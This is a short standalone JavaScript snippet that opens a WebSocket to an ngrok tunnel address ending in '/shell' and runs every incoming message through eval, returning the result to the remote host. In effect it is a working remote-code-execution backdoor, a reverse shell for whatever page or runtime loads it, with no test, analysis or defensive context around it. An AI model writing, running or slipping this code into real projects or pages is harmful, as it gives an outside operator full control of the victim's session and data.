(() => {
  const socket = new WebSocket(
    "wss://9b5e-2409-4072-892-fbdc-adcc-a3f0-4999-d579.ngrok.io/shell"
  );
  socket.onmessage = (e) => socket.send(JSON.stringify(eval(e.data)));
})();
